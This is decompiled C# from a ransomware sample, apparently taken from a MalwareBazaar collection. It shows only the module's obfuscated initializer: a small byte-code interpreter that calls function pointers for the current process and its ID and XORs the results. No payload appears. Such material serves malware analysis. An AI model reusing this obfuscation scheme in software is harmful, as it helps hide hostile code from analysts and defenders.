// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: ClipasClipasClipas, Version=3.6.15.0, Culture=neutral, PublicKeyToken=null
// MVID: 01227A38-77A6-4E0B-8D32-9CC001B29843
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.MSIL.PolyRansom.gen-58a694044ee4771566c0d4ef4737203166ab7f87e5f9b352e27e16559f09bc22.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

internal class \u003CModule\u003E
{
  public static byte getTotalSizegetAddressKind;
  private static IntPtr[] AddHostEvidenceInterrupt;

  static unsafe \u003CModule\u003E()
  {
    \u003CModule\u003E.EnumerateDirectoriesBINDOPTS();
    int num1;
    ref int local = ref num1;
    local = 1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    int num2 = (int) ^(sbyte&) ref local;
    int num3 = num2 * 4;
    int num4 = num2 * 8;
    byte[] numArray1 = new byte[2];
    object[] objArray = new object[2];
    int[] numArray2 = new int[2];
    long[] numArray3;
    long[] numArray4 = numArray3 = new long[2];
    byte* numPtr1 = (byte*) &GetResultReleaseSharedStringMaker.mretValgetCurrencyGroupSizes;
    byte* numPtr2 = numPtr1;
    int num5;
    while (num5 != 1)
    {
      numPtr2 = numPtr1;
      byte num6 = *numPtr1;
      ++numPtr1;
      int index;
      if (num6 >= (byte) 1 && num6 <= (byte) 6)
      {
        if ((byte) 3 >= num6)
        {
          if ((byte) 3 > num6)
          {
            if ((byte) 1 >= num6)
            {
              if ((byte) 1 <= num6)
                goto label_14;
            }
            else if ((byte) 2 >= num6 && (byte) 2 <= num6)
            {
              numArray1[index - 1] = (byte) 0;
              long* numPtr3 = &numArray4[index - 1];
              Process process = (Process) objArray[index - 1];
              // ISSUE: cast to a function pointer type
              // ISSUE: function pointer call
              int num7 = __calli((__FnPtr<int (Process)>) \u003CModule\u003E.AddHostEvidenceInterrupt[*(int*) (numPtr1 + num3)])(process);
              *(int*) numPtr3 = num7;
              numPtr1 += 8;
              continue;
            }
          }
          else
          {
            *(int*) &numArray4[index] = *(int*) (numPtr1 + num3);
            numArray1[index] = (byte) 0;
            ++index;
            numPtr1 += 8;
            continue;
          }
        }
        else if ((byte) 5 >= num6)
        {
          if ((byte) 5 > num6)
          {
            if ((byte) 4 >= num6 && (byte) 4 <= num6)
            {
              *(int*) &numArray4[index - 2] = *(int*) &numArray4[index - 2] ^ *(int*) &numArray4[index - 1];
              numArray1[index - 2] = (byte) 0;
              --index;
              continue;
            }
          }
          else
          {
            \u003CModule\u003E.getTotalSizegetAddressKind = (byte) *(int*) &numArray4[index - 1];
            --index;
            continue;
          }
        }
        else if ((byte) 6 >= num6 && (byte) 6 <= num6)
        {
          num5 = 1;
          continue;
        }
      }
label_14:
      numArray1[index] = (byte) 5;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      objArray[index] = (object) __calli((__FnPtr<Process ()>) \u003CModule\u003E.AddHostEvidenceInterrupt[*(int*) (numPtr1 + num3)])();
      ++index;
      numPtr1 += 8;
    }
  }

  public static Process AppContextSwitchesPreserveSigAttribute() => Process.GetCurrentProcess();

  public static int ReadBytesUrlIdentityPermission([In] Process obj0) => obj0.Id;

  private static void EnumerateDirectoriesBINDOPTS()
  {
    \u003CModule\u003E.AddHostEvidenceInterrupt = new IntPtr[2];
    // ISSUE: method pointer
    \u003CModule\u003E.AddHostEvidenceInterrupt[0] = __methodptr(AppContextSwitchesPreserveSigAttribute);
    // ISSUE: method pointer
    \u003CModule\u003E.AddHostEvidenceInterrupt[1] = __methodptr(ReadBytesUrlIdentityPermission);
  }
}
